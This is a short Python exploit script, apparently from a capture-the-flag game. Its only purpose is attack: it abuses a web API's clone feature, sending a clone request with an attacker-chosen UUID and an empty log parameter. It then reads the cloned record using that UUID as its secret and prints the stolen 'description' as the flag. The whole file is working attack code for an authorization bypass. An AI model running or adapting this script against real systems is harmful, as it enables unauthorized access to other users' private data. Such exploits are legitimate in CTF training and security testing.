import requests, argparse, uuid, json

if __name__ == "__main__":
	parser = argparse.ArgumentParser()
	parser.add_argument("base_url")
	parser.add_argument("id")
	args = parser.parse_args()

	exploit_id = str(uuid.uuid4())

	requests.get(f"{args.base_url}/api/{args.id}?clone_uuid={exploit_id}&clone_log=")
	response = requests.get(f"{args.base_url}/api/{exploit_id}?secret={exploit_id}").json()

	print("Flag:", response.get("description"))
